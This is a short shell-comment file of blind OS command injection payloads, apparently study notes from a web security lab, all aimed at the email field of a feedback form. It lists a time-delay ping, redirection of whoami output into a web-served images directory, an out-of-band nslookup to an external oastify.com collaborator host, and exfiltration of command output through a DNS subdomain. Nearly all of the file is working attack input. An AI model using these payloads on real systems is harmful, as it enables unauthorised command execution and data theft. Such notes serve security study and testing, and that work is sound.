#!/bin/bash

# All of these were in email field of submit feedback

# Blind with time delays
# If successful, pings loopback for 10 seconds
& ping -c10 127.0.0.1 &

# Blind with output redirection
# Writes to a directory, look for things like host/images or host/static
# I opened an image in a new tab
& whoami > /var/www/images/whoami.txt &

# Blind with out of band interaction
& nslookup mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com &

# You can then append commands like:
# Blind with out of band interaction and data exfil
$(whoami).mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com or `whoami`.mi86pgr46evnqr4veh8s7s9i89e02qqf.oastify.com